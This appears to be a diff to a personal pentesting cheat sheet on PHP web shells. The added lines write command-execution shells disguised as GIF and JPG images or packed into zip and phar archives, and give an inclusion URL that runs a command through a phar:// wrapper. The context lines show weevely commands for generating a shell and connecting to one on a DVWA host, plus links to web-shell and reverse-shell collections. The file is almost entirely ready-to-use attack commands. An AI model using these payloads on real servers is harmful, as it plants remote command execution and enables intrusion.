@@ -1,3 +1,12 @@
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+
+
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+
+
+
 #weevely tool
 weevely generate 123456 /root/shell.php
 weevely http://192.168.1.1/dvwa/hackable/upload/shell.php 123456
@@ -43,4 +52,5 @@ https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell
 https://github.com/x-o-r-r-o/PHP-Webshells-Collection
 https://github.com/topics/web-shell
 https://github.com/fuzzdb-project/fuzzdb (important)
+
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
